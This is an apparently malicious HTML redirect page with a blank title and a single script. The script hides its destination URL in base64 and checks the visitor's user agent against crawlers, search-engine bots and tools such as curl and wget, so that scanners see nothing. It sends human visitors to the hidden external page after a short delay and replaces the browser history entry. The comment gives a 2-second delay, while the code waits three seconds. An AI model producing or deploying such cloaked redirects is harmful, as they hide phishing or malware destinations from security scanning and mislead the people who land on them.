<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>body{margin:0;padding:0;background:#fff;overflow:hidden;}</style>
</head>
<body>
<script>
    // Base64 encoded target URL
    const encodedUrl = "aHR0cHM6Ly9yZW5la2l0emVuLmNvbS9wYWlnZS5odG1s";

    // Bot detection
    function isLikelyBot() {
        const ua = (navigator.userAgent || '').toLowerCase();
        const bots = ['bot','crawler','spider','slurp','scraper','headless','curl','wget','python','http','facebookexternal','googlebot','bingbot','yandex','baidu'];
        return bots.some(b => ua.includes(b));
    }

    if (isLikelyBot()) {
        // Silent block for bots
        console.warn("Access restricted");
    } else {
        // Decode and redirect after 2 seconds
        const target = atob(encodedUrl);
        
        setTimeout(() => {
            window.location.replace(target);   // replace = no back button history
        }, 3000);
    }
</script>
</body>
</html>
